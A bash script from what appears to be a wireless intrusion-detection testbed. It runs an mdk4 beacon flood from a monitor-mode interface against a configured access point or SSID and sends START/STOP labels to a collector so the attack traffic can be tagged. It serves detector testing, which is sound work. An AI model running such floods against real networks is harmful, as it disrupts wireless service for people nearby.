#!/usr/bin/env bash
# Beacon flood + labeling (Kali / monitor mode). SMOKE ONLY — not a new train baseline.
# Usage: sudo -E ./host/attacks/attack_beacon_flood.sh
#
# Needs mdk4. Quiet RF is OK for this smoke: we only check beacon_packets / BEACON
# subtype rises vs IDLE. Do not add unique_bssid as an absolute board feature today.
set -euo pipefail
DIR="$(cd "$(dirname "$0")" && pwd)"
# shellcheck source=netconfig.sh
source "${DIR}/netconfig.sh"

LABEL_SENT=0
_cleanup_label() {
  if [[ "${LABEL_SENT}" -eq 1 ]]; then
    echo ">>> cleanup: sending STOP BEACON_FLOOD" >&2
    send_label STOP BEACON_FLOOD || true
    LABEL_SENT=0
  fi
}
trap _cleanup_label EXIT

if ! command -v mdk4 >/dev/null 2>&1; then
  echo ">>> ERROR: mdk4 not found. apt install mdk4" >&2
  exit 1
fi

if ! ip link show "$MON_IFACE" >/dev/null 2>&1; then
  _alt="$(iw dev 2>/dev/null | awk '/^[[:space:]]*Interface /{iface=$2} /^[[:space:]]*type monitor/{print iface; exit}')"
  if [[ -n "${_alt:-}" ]]; then
    MON_IFACE="$_alt"
    export NIDS_MON_IFACE="$_alt"
  else
    bash "${DIR}/prepare_wifi.sh" monitor
    MON_IFACE="${NIDS_MON_IFACE:-$MON_IFACE}"
  fi
fi
if ! ip link show "$MON_IFACE" >/dev/null 2>&1; then
  echo ">>> ERROR: no monitor iface" >&2
  exit 1
fi

ensure_label_path || exit 1

BSSID="${NIDS_BSSID:-$(_json_field ap_bssid 2>/dev/null || true)}"
CHANNEL="${NIDS_WIFI_CHANNEL:-$(_json_field channel 2>/dev/null || true)}"
DURATION="${NIDS_BEACON_FLOOD_SEC:-45}"

if [[ -n "${CHANNEL:-}" && "$CHANNEL" != "null" && "$CHANNEL" != "0" ]]; then
  iw dev "$MON_IFACE" set channel "$CHANNEL" 2>/dev/null \
    || iwconfig "$MON_IFACE" channel "$CHANNEL" 2>/dev/null || true
fi

echo ">>> Monitor iface    : $MON_IFACE"
echo ">>> AP BSSID (opt)   : ${BSSID:-none}"
echo ">>> Channel          : ${CHANNEL:-?}"
echo ">>> Duration         : ${DURATION}s"
echo ">>> Label host       : $(get_label_host):${LABEL_PORT}"
echo ">>> READY FOR BEACON_FLOOD"

send_label START BEACON_FLOOD
LABEL_SENT=1
sleep 0.5

set +e
if [[ -n "${BSSID:-}" && "$BSSID" != "null" ]]; then
  timeout "$DURATION" mdk4 "$MON_IFACE" b -a "$BSSID"
else
  timeout "$DURATION" mdk4 "$MON_IFACE" b -n "$SSID"
fi
rc=$?
set -e
echo ">>> mdk4 finished rc=${rc} (124=timeout/duration OK)"

sleep 1
send_label STOP BEACON_FLOOD
LABEL_SENT=0
echo " >>> BEACON_FLOOD FINISHED"
echo " >>> Next: sudo -E ./host/attacks/prepare_wifi.sh managed"
